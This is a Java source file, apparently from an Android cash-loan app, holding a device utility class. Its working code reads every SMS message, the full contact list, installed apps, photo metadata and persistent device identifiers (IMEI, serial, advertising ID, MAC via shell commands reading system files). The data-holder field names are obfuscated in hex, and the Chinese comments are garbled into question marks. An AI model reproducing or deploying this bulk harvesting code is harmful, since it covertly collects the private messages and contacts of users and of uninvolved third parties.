package com.kredit.cash.loan.app.utils;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.CellSignalStrengthCdma;
import android.telephony.CellSignalStrengthGsm;
import android.telephony.CellSignalStrengthLte;
import android.telephony.CellSignalStrengthWcdma;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.Utils;
import com.kredit.cash.loan.app.bean.AppInfoBean;
import com.kredit.cash.loan.app.bean.ContactsBean;
import com.kredit.cash.loan.app.bean.PhotoInfoBean;
import com.kredit.cash.loan.app.bean.SMSInfoBean;
import com.kredit.cash.loan.app.common.Constant;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.kredit.cash.loan.app.bean.ContactsBean;
import com.kredit.cash.loan.app.bean.SMSInfoBean;
import com.tcl.base.utils.MmkvUtil;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.LineNumberReader;
import java.io.Reader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Enumeration;
import java.util.List;
import java.util.Locale;
import java.util.UUID;

public class DeviceUtils {
    private static final String TAG = "DeviceUtils";

    /**
     * ??????ip??????(??????)
     */
    public static String getLocalIPAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {

                NetworkInterface intf = en.nextElement();

                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {

                    InetAddress inetAddress = enumIpAddr.nextElement();

                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        // return inetAddress.getAddress().toString();
                        return inetAddress.getHostAddress().toString();
                    }
                }
            }
        } catch (SocketException ex) {
            Log.e("BaseScanTvDeviceClient", "????????????IP false =" + ex.toString());
        }
        return null;
    }

    /**
     * ??????ip??????(??????) ?????????????????????????????????
     */
    public static String getGlobalIPAddress() {
        return MmkvUtil.INSTANCE.decodeString(Constant.IPADDRESS);
    }

    /**
     * ???????????????????????????
     *
     * @param pageIndex ???0??????
     * @param pageSize  ????????????
     */

    public static List<PhotoInfoBean> getLocalAlbumList(int pageIndex, int pageSize, Uri mImageUri) {
        List<PhotoInfoBean> photos = new ArrayList<>();
        try {
            Cursor mCursor = Utils.getApp().getContentResolver().query(mImageUri, null,
                    MediaStore.Images.Media.MIME_TYPE + "=? or "
                            + MediaStore.Images.Media.MIME_TYPE + "=? ",
                    new String[]{"image/jpeg", "image/png"}, MediaStore.Images.Media.DATE_MODIFIED + " limit " + (pageIndex * pageSize) + "," + pageSize);

            while (mCursor.moveToNext()) {
                String createDate = mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED));
                String height = mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.HEIGHT));
                String width = mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.WIDTH));
                String name = mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
//                String author = mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.AUTHOR));
//                String dateModified = mCursor.getString(mCursor.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED));
                PhotoInfoBean bean = new PhotoInfoBean(name, "author", createDate, width, height);
                photos.add(bean);
            }

            if (photos.isEmpty()) {
                Uri imageUri = MediaStore.Images.Media.INTERNAL_CONTENT_URI;
                getLocalAlbumList(0, 10000, imageUri);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return photos;
    }

    /**
     * ????????????????????????
     */
    public static int readExternalMusicNum() {
        Cursor cursor = Utils.getApp().getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, null, null,
                null, MediaStore.Audio.AudioColumns.IS_MUSIC);
        int num = 0;
        if (cursor != null) {
            while (cursor.moveToNext()) {
                num++;
            }
            cursor.close();
        }
        return num;
    }

    /**
     * ????????????????????????
     */
    public static int readInternalMusicNum() {
        Cursor cursor = Utils.getApp().getContentResolver().query(MediaStore.Audio.Media.INTERNAL_CONTENT_URI, null, null,
                null, MediaStore.Audio.AudioColumns.IS_MUSIC);
        int num = 0;
        if (cursor != null) {
            while (cursor.moveToNext()) {
                num++;
            }
            cursor.close();
        }
        return num;
    }

    /**
     * ????????????????????????
     */
    public static int readInternalVideoNum() {
        Cursor cursor = Utils.getApp().getContentResolver().query(MediaStore.Video.Media.INTERNAL_CONTENT_URI, null, null,
                null, MediaStore.Video.Media.DISPLAY_NAME);
        int num = 0;
        if (cursor != null) {
            while (cursor.moveToNext()) {
                num++;
            }
            cursor.close();
        }
        return num;
    }

    /**
     * ????????????????????????
     */
    public static int readExternalVideoNum() {
        Cursor cursor = Utils.getApp().getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null, null,
                null, MediaStore.Video.Media.DISPLAY_NAME);
        int num = 0;
        if (cursor != null) {
            while (cursor.moveToNext()) {
                num++;
            }
            cursor.close();
        }
        return num;
    }

    /**
     * ????????????????????????
     */
    public static int readExternalImgNum() {
        Cursor cursor = Utils.getApp().getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media.DATA},
                MediaStore.Images.ImageColumns.MIME_TYPE + "=? or "
                        + MediaStore.Images.ImageColumns.MIME_TYPE + "=?",
                new String[]{"image/jpeg", "image/png"},
                MediaStore.Images.ImageColumns.DATE_MODIFIED);
        int num = 0;
        if (cursor != null) {
            while (cursor.moveToNext()) {
                num++;
            }
            cursor.close();
        }
        return num;
    }

    /**
     * ????????????????????????
     */
    public static int readInternalImgNum() {
        Cursor cursor = Utils.getApp().getContentResolver().query(MediaStore.Images.Media.INTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media.DATA},
                MediaStore.Images.ImageColumns.MIME_TYPE + "=? or "
                        + MediaStore.Images.ImageColumns.MIME_TYPE + "=?",
                new String[]{"image/jpeg", "image/png"},
                MediaStore.Images.ImageColumns.DATE_MODIFIED);
        int num = 0;
        if (cursor != null) {
            while (cursor.moveToNext()) {
                num++;
            }
            cursor.close();
        }
        return num;
    }

    /**
     * ????????????????????????
     */
    public static int readDownloadNum() {
        Cursor cursor = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
            cursor = Utils.getApp().getContentResolver().query(MediaStore.Downloads.INTERNAL_CONTENT_URI, null, null,
                    null, MediaStore.Downloads.IS_DOWNLOAD);
        }
        int num = 0;
        if (cursor != null) {
            while (cursor.moveToNext()) {
                num++;
            }
            cursor.close();
        }
        return num;
    }

    /**
     * ????????????????????????
     *
     * @return ??????????????????
     */
    public static String getDeviceId() {
        StringBuilder sbDeviceId = new StringBuilder();

        //??????????????????IMEI???>=6.0 ??????ReadPhoneState?????????
        String imei = getIMEI();
        //??????AndroidId??????????????????
        String androidid = getAndroidId();
        //???????????????????????????????????????
        String serial = getSERIAL();
        //????????????uuid????????????????????????????????????uuid?????????????????????
        String uuid = getDeviceUUID().replace("-", "");

        //??????imei
        if (imei != null && imei.length() > 0) {
            sbDeviceId.append(imei);
            sbDeviceId.append("|");
        }
        //??????androidid
        if (androidid != null && androidid.length() > 0) {
            sbDeviceId.append(androidid);
            sbDeviceId.append("|");
        }
        //??????serial
        if (serial != null && serial.length() > 0) {
            sbDeviceId.append(serial);
            sbDeviceId.append("|");
        }
        //????????????uuid
        if (uuid != null && uuid.length() > 0) {
            sbDeviceId.append(uuid);
        }

        //??????SHA1?????????DeviceId??????
        if (sbDeviceId.length() > 0) {
            try {
                byte[] hash = getHashByString(sbDeviceId.toString());
                String sha1 = bytesToHex(hash);
                if (sha1 != null && sha1.length() > 0) {
                    //???????????????DeviceId
                    return sha1;
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        //????????????????????????????????????????????????
        //???DeviceId??????????????????????????????????????????DeviceId?????????
        return UUID.randomUUID().toString().replace("-", "");
    }

    //????????????READ_PHONE_STATE?????????>=6.0???????????????null
    public static String getIMEI() {
        try {
            TelephonyManager tm = (TelephonyManager)
                    Utils.getApp().getSystemService(Context.TELEPHONY_SERVICE);
            return tm.getDeviceId();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "";
    }

    /**
     * ???????????????AndroidId
     *
     * @return ?????????AndroidId
     */
    public static String getAndroidId() {
        try {
            return Settings.Secure.getString(Utils.getApp().getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "";
    }

    /**
     * ??????????????????????????????WTK7N16923005607???, ????????????????????????
     *
     * @return ???????????????
     */
    public static String getSERIAL() {
        try {
            return Build.SERIAL;
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return "";
    }

    /**
     * ??????????????????uuid
     * ?????????????????????????????????????????????
     *
     * @return ????????????uuid
     */
    public static String getDeviceUUID() {
        try {
            String dev = "3883756" +
                    Build.BOARD.length() % 10 +
                    Build.BRAND.length() % 10 +
                    Build.DEVICE.length() % 10 +
                    Build.HARDWARE.length() % 10 +
                    Build.ID.length() % 10 +
                    Build.MODEL.length() % 10 +
                    Build.PRODUCT.length() % 10 +
                    Build.SERIAL.length() % 10;
            return new UUID(dev.hashCode(),
                    Build.SERIAL.hashCode()).toString();
        } catch (Exception ex) {
            ex.printStackTrace();
            return "";
        }
    }

    /**
     * ???SHA1
     *
     * @param data ??????
     * @return ?????????hash???
     */
    private static byte[] getHashByString(String data) {
        try {
            MessageDigest messageDigest = MessageDigest.getInstance("SHA1");
            messageDigest.reset();
            messageDigest.update(data.getBytes("UTF-8"));
            return messageDigest.digest();
        } catch (Exception e) {
            return "".getBytes();
        }
    }

    /**
     * ???16???????????????
     *
     * @param data ??????
     * @return 16???????????????
     */
    private static String bytesToHex(byte[] data) {
        StringBuilder sb = new StringBuilder();
        String stmp;
        for (int n = 0; n < data.length; n++) {
            stmp = (Integer.toHexString(data[n] & 0xFF));
            if (stmp.length() == 1)
                sb.append("0");
            sb.append(stmp);
        }
        return sb.toString().toUpperCase(Locale.CHINA);
    }

    //?????? GAID ???????????????????????????
    public static String getGAID() {
        String gaid = "";
        AdvertisingIdClient.Info adInfo = null;
        try {
            adInfo = AdvertisingIdClient.getAdvertisingIdInfo(Utils.getApp());
        } catch (IOException e) {
            // Unrecoverable error connecting to Google Play services (e.g.,
            // the old version of the service doesn't support getting AdvertisingId).
            Log.e("getGAID", "IOException");
        } catch (GooglePlayServicesNotAvailableException e) {
            // Google Play services is not available entirely.
            Log.e("getGAID", "GooglePlayServicesNotAvailableException");
        } catch (Exception e) {
            Log.e("getGAID", "Exception:" + e.toString());
            // Encountered a recoverable error connecting to Google Play services.
        }
        if (adInfo != null) {
            gaid = adInfo.getId();
            Log.w("getGAID", "gaid:" + gaid);
        }
        return gaid;
    }

    /**
     * ?????????????????????????????????????????? android.permission.ACCESS_COARSE_LOCATION
     * API???????????????17
     *
     * @return ??????????????????????????????, ?????? dBm(-1?????????????????????????????????)
     */

    public static int getMobileDbm() {
        int dbm = -1;
        TelephonyManager tm = (TelephonyManager) Utils.getApp().getSystemService(Context.TELEPHONY_SERVICE);
        List<CellInfo> cellInfoList;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR1) {
            if (ActivityCompat.checkSelfPermission(Utils.getApp(), Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return dbm;
            } else {
                cellInfoList = tm.getAllCellInfo();
                if (null != cellInfoList) {
                    for (CellInfo cellInfo : cellInfoList) {
                        if (cellInfo instanceof CellInfoGsm) {
                            CellSignalStrengthGsm cellSignalStrengthGsm = ((CellInfoGsm) cellInfo).getCellSignalStrength();
                            dbm = cellSignalStrengthGsm.getDbm();
                        } else if (cellInfo instanceof CellInfoCdma) {
                            CellSignalStrengthCdma cellSignalStrengthCdma =
                                    ((CellInfoCdma) cellInfo).getCellSignalStrength();
                            dbm = cellSignalStrengthCdma.getDbm();
                        } else if (cellInfo instanceof CellInfoWcdma) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                                CellSignalStrengthWcdma cellSignalStrengthWcdma =
                                        ((CellInfoWcdma) cellInfo).getCellSignalStrength();
                                dbm = cellSignalStrengthWcdma.getDbm();
                            }
                        } else if (cellInfo instanceof CellInfoLte) {
                            CellSignalStrengthLte cellSignalStrengthLte = ((CellInfoLte) cellInfo).getCellSignalStrength();
                            dbm = cellSignalStrengthLte.getDbm();
                        }
                    }
                }
            }
        }
        return dbm;
    }

    /**
     * ????????????????????????
     *
     * @return
     */
    public static long getSystemStartupTime() {
        return System.currentTimeMillis() - SystemClock.elapsedRealtime();
    }

    /**
     * ??????mac??????
     *
     * @return
     */
    public static String getMac() {
        String strMac = null;
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            strMac = getLocalMacAddressFromWifiInfo(Utils.getApp());
            return strMac;
        } else if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N
                && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            strMac = getMacAddress(Utils.getApp());
            return strMac;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Log.e("=====", "7.0??????");
            if (!TextUtils.isEmpty(getMacAddress())) {
                strMac = getMacAddress();
                return strMac;
            } else if (!TextUtils.isEmpty(getMachineHardwareAddress())) {
                strMac = getMachineHardwareAddress();
                return strMac;
            } else {
                strMac = getLocalMacAddressFromBusybox();
                return strMac;
            }
        }
        return "02:00:00:00:00:00";
    }


    /**
     * ??????wifi??????????????????mac
     *
     * @param context
     * @return
     */
    public static String getLocalMacAddressFromWifiInfo(Context context) {
        WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
        WifiInfo winfo = wifi.getConnectionInfo();
        String mac = winfo.getMacAddress();
        return mac;
    }

    /**
     * android 6.0????????????7.0?????? ??????mac??????
     *
     * @param context
     * @return
     */
    public static String getMacAddress(Context context) {

        // ?????????6.0?????????????????????wifimanager??????
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            String macAddress0 = getMacAddress0(context);
            if (!TextUtils.isEmpty(macAddress0)) {
                return macAddress0;
            }
        }
        String str = "";
        String macSerial = "";
        try {
            Process pp = Runtime.getRuntime().exec(
                    "cat /sys/class/net/wlan0/address");
            InputStreamReader ir = new InputStreamReader(pp.getInputStream());
            LineNumberReader input = new LineNumberReader(ir);
            for (; null != str; ) {
                str = input.readLine();
                if (str != null) {
                    macSerial = str.trim();// ?????????
                    break;
                }
            }
        } catch (Exception ex) {
            Log.e("----->" + "NetInfoManager", "getMacAddress:" + ex.toString());
        }
        if (macSerial == null || "".equals(macSerial)) {
            try {
                return loadFileAsString("/sys/class/net/eth0/address")
                        .toUpperCase().substring(0, 17);
            } catch (Exception e) {
                e.printStackTrace();
                Log.e("----->" + "NetInfoManager",
                        "getMacAddress:" + e.toString());
            }

        }
        return macSerial;
    }

    private static String getMacAddress0(Context context) {
        if (isAccessWifiStateAuthorized(context)) {
            WifiManager wifiMgr = (WifiManager) context
                    .getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = null;
            try {
                wifiInfo = wifiMgr.getConnectionInfo();
                return wifiInfo.getMacAddress();
            } catch (Exception e) {
                Log.e("----->" + "NetInfoManager",
                        "getMacAddress0:" + e.toString());
            }

        }
        return "";

    }

    /**
     * Check whether accessing wifi state is permitted
     *
     * @param context
     * @return
     */
    private static boolean isAccessWifiStateAuthorized(Context context) {
        if (PackageManager.PERMISSION_GRANTED == context
                .checkCallingOrSelfPermission("android.permission.ACCESS_WIFI_STATE")) {
            Log.e("----->" + "NetInfoManager", "isAccessWifiStateAuthorized:"
                    + "access wifi state is enabled");
            return true;
        } else
            return false;
    }

    private static String loadFileAsString(String fileName) throws Exception {
        FileReader reader = new FileReader(fileName);
        String text = loadReaderAsString(reader);
        reader.close();
        return text;
    }

    private static String loadReaderAsString(Reader reader) throws Exception {
        StringBuilder builder = new StringBuilder();
        char[] buffer = new char[4096];
        int readLength = reader.read(buffer);
        while (readLength >= 0) {
            builder.append(buffer, 0, readLength);
            readLength = reader.read(buffer);
        }
        return builder.toString();
    }

    /**
     * ??????IP????????????MAC??????
     *
     * @return
     */
    public static String getMacAddress() {
        String strMacAddr = null;
        try {
            // ??????IpD??????
            InetAddress ip = getLocalInetAddress();
            byte[] b = NetworkInterface.getByInetAddress(ip)
                    .getHardwareAddress();
            StringBuffer buffer = new StringBuffer();
            for (int i = 0; i < b.length; i++) {
                if (i != 0) {
                    buffer.append(':');
                }
                String str = Integer.toHexString(b[i] & 0xFF);
                buffer.append(str.length() == 1 ? 0 + str : str);
            }
            strMacAddr = buffer.toString().toUpperCase();
        } catch (Exception e) {
        }
        return strMacAddr;
    }

    /**
     * ????????????????????????IP
     *
     * @return
     */
    private static InetAddress getLocalInetAddress() {
        InetAddress ip = null;
        try {
            // ??????
            Enumeration<NetworkInterface> en_netInterface = NetworkInterface
                    .getNetworkInterfaces();
            while (en_netInterface.hasMoreElements()) {// ??????????????????
                NetworkInterface ni = (NetworkInterface) en_netInterface
                        .nextElement();// ?????????????????????
                Enumeration<InetAddress> en_ip = ni.getInetAddresses();// ????????????ip???????????????
                while (en_ip.hasMoreElements()) {
                    ip = en_ip.nextElement();
                    if (!ip.isLoopbackAddress()
                            && ip.getHostAddress().indexOf(":") == -1)
                        break;
                    else
                        ip = null;
                }

                if (ip != null) {
                    break;
                }
            }
        } catch (SocketException e) {

            e.printStackTrace();
        }
        return ip;
    }

    /**
     * ????????????IP
     *
     * @return
     */
    private static String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface
                    .getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf
                        .getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress()) {
                        return inetAddress.getHostAddress().toString();
                    }
                }
            }
        } catch (SocketException ex) {
            ex.printStackTrace();
        }
        return null;
    }


    /**
     * android 7.0????????? ???2?????????????????????????????????mac??????
     *
     */
    /**
     * ????????????HardwareAddress??????
     *
     * @return
     */
    public static String getMachineHardwareAddress() {
        Enumeration<NetworkInterface> interfaces = null;
        try {
            interfaces = NetworkInterface.getNetworkInterfaces();
        } catch (SocketException e) {
            e.printStackTrace();
        }
        String hardWareAddress = null;
        NetworkInterface iF = null;
        if (interfaces == null) {
            return null;
        }
        while (interfaces.hasMoreElements()) {
            iF = interfaces.nextElement();
            try {
                hardWareAddress = bytesToString(iF.getHardwareAddress());
                if (hardWareAddress != null)
                    break;
            } catch (SocketException e) {
                e.printStackTrace();
            }
        }
        return hardWareAddress;
    }

    /***
     * byte??????String
     *
     * @param bytes
     * @return
     */
    private static String bytesToString(byte[] bytes) {
        if (bytes == null || bytes.length == 0) {
            return null;
        }
        StringBuilder buf = new StringBuilder();
        for (byte b : bytes) {
            buf.append(String.format("%02X:", b));
        }
        if (buf.length() > 0) {
            buf.deleteCharAt(buf.length() - 1);
        }
        return buf.toString();
    }


    /**
     * android 7.0????????? ???3?????????busybox?????????????????????mac??????
     *
     */

    /**
     * ??????busybox????????????Mac
     *
     * @return
     */
    public static String getLocalMacAddressFromBusybox() {
        String result = "";
        String Mac = "";
        result = callCmd("busybox ifconfig", "HWaddr");
        // ???????????????result == null???????????????????????????
        if (result == null) {
            return "network anomaly";
        }
        // ???????????????????????????
        // ?????????eth0 Link encap:Ethernet HWaddr 00:16:E8:3E:DF:67
        if (result.length() > 0 && result.contains("HWaddr") == true) {
            Mac = result.substring(result.indexOf("HWaddr") + 6,
                    result.length() - 1);
            result = Mac;
        }
        return result;
    }

    private static String callCmd(String cmd, String filter) {
        String result = "";
        String line = "";
        try {
            Process proc = Runtime.getRuntime().exec(cmd);
            InputStreamReader is = new InputStreamReader(proc.getInputStream());
            BufferedReader br = new BufferedReader(is);

            while ((line = br.readLine()) != null
                    && line.contains(filter) == false) {
                result += line;
            }

            result = line;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }

    /**
     * ??????????????????
     *
     * @return ????????????
     */
    public static String getDeviceBrand() {
        return android.os.Build.BRAND;
    }

    /**
     * ???????????????wifi??????
     */
    public static int getAroundWifiNum() {
        WifiManager mWifiManager = (WifiManager) Utils.getApp().getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        List<ScanResult> scanResults = mWifiManager.getScanResults();//????????????????????????
        List<ScanResult> newScanResultList = new ArrayList<>();
        for (ScanResult scanResult : scanResults) {
            int position = getItemPosition(newScanResultList, scanResult);
            if (position != -1) {
                if (newScanResultList.get(position).level < scanResult.level) {
                    newScanResultList.remove(position);
                    newScanResultList.add(position, scanResult);
                }
            } else {
                newScanResultList.add(scanResult);
            }
        }
        return newScanResultList.size();
    }

    /**
     * ??????item???list????????????
     */
    private static int getItemPosition(List<ScanResult> list, ScanResult item) {
        for (int i = 0; i < list.size(); i++) {
            if (item.SSID.equals(list.get(i).SSID)) {
                return i;
            }
        }
        return -1;
    }

    public static long getSDTotalSize() {
        /*?????????????????????*/
        File sdcardDir = Environment.getExternalStorageDirectory();
        /*StatFs ?????????????????????????????????*/
        StatFs statFs = new StatFs(sdcardDir.getPath());
        long blockSize = statFs.getBlockSizeLong();

        long totalSize = statFs.getBlockCountLong();

        return blockSize * totalSize;
    }

    /**
     * ??????sd???????????????
     *
     * @return
     */
    public static long getSdAvaliableSize() {
        File path = Environment.getExternalStorageDirectory();
        StatFs statFs = new StatFs(path.getPath());
        long blockSize = statFs.getBlockSizeLong();
        long availableBlocks = statFs.getAvailableBlocksLong();
        return blockSize * availableBlocks;
    }

    /**
     * ????????????????????????
     *
     * @return
     */
    public static long getRomTotalSize() {
        File path = Environment.getDataDirectory();
        StatFs statFs = new StatFs(path.getPath());
        long blockSize = statFs.getBlockSizeLong();
        long tatalBlocks = statFs.getBlockCountLong();
        return blockSize * tatalBlocks;
    }

    /**
     * ????????????????????????
     *
     * @return
     */
    public static long getRomAvailableSize() {
        File path = Environment.getDataDirectory();
        StatFs statFs = new StatFs(path.getPath());
        long blockSize = statFs.getBlockSizeLong();
        long availableBlocks = statFs.getAvailableBlocksLong();
        return blockSize * availableBlocks;
    }

    public static List<SMSInfoBean> getSmsInPhone() {
        final String SMS_URI_ALL = "content://sms/";
        final String SMS_URI_INBOX = "content://sms/inbox";
        final String SMS_URI_SEND = "content://sms/sent";
        final String SMS_URI_DRAFT = "content://sms/draft";
        StringBuilder smsBuilder = new StringBuilder();
        List<SMSInfoBean> smsList = new ArrayList<>();
        try {
            ContentResolver cr = Utils.getApp().getContentResolver();
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type", "read", "status"};
            Uri uri = Uri.parse(SMS_URI_ALL);
            Cursor cur = cr.query(uri, projection, null, null, "date desc");
            if (cur != null && cur.moveToFirst()) {
                String name;
                String phoneNumber;
                String smsbody;
                String date;
                int nameColumn = cur.getColumnIndex("person");
                int phoneNumberColumn = cur.getColumnIndex("address");
                int smsbodyColumn = cur.getColumnIndex("body");
                int dateColumn = cur.getColumnIndex("date");
                int typeColumn = cur.getColumnIndex("type");
                int readColumn = cur.getColumnIndex("read");
                int statusColumn = cur.getColumnIndex("status");
                do {
                    name = cur.getString(nameColumn);
                    phoneNumber = cur.getString(phoneNumberColumn);
                    smsbody = cur.getString(smsbodyColumn);
                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                    Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
                    date = dateFormat.format(d);
                    int typeId = cur.getInt(typeColumn);
                    SMSInfoBean smsInfoBean = new SMSInfoBean();
                    smsInfoBean.set808D8491(typeId);
                    smsInfoBean.set849C9B9A91(phoneNumber);
                    smsInfoBean.set969B908D(smsbody);
                    smsInfoBean.set86919590(readColumn);
                    smsInfoBean.set8791919A(readColumn);
                    smsInfoBean.set878095808187(statusColumn);
                    smsInfoBean.set95909086918787(name);
                    smsInfoBean.set87919A90BB86909186A69197919D8291A09D9991(date);
                    smsList.add(smsInfoBean);
                } while (cur.moveToNext());
            }
        } catch (SQLiteException ex) {
            Log.d("SQLiteException", ex.getMessage());
        }
        return smsList;
    }

    //?????????????????????
    public static List<ContactsBean> getContacts() {
        List<ContactsBean> contacts = new ArrayList<>();
        ContentResolver cr = Utils.getApp().getContentResolver();
        //?????????????????????uri
        Uri phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String num = ContactsContract.CommonDataKinds.Phone.NUMBER;
        String name = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME;
        String updatedTimestamp = ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP;
        Cursor cursor = cr.query(phoneUri, new String[]{num, name, updatedTimestamp}, null, null, null);
        while (cursor.moveToNext()) {
            ContactsBean phoneDto = new ContactsBean();
            phoneDto.set879B81869791(cursor.getString(cursor.getColumnIndex(name)));
            phoneDto.set849C9B9A91(cursor.getString(cursor.getColumnIndex(num)));
            String timeStr = cursor.getString(cursor.getColumnIndex(updatedTimestamp));
            String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Long.valueOf(timeStr));
            phoneDto.set818490958091A09D9991(time);
            contacts.add(phoneDto);
        }
        return contacts;
    }

    /**
     * ?????????????????????????????????
     */
    public static List<AppInfoBean> getAllAppInfo() {
        ArrayList<AppInfoBean> appBeanList = new ArrayList<>();
        PackageManager packageManager = Utils.getApp().getPackageManager();
        List<PackageInfo> list = packageManager.getInstalledPackages(0);
        for (PackageInfo t : list) {
            AppInfoBean bean = new AppInfoBean();
            ApplicationInfo p = t.applicationInfo;
            bean.set958484BA959991(p.loadLabel(packageManager).toString());
            bean.set9298959387(p.flags);
            bean.set8495979FB59391(p.packageName);
            bean.set829186879D9B9AB79B9091(t.versionCode);
            bean.set829186879D9B9ABA959991(t.versionName);
            // ??????????????????????????????apk
            if ((p.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                bean.set958484A08D8491(1);
            } else {
                bean.set958484A08D8491(0);
            }
            appBeanList.add(bean);
        }
        return appBeanList;
    }
}
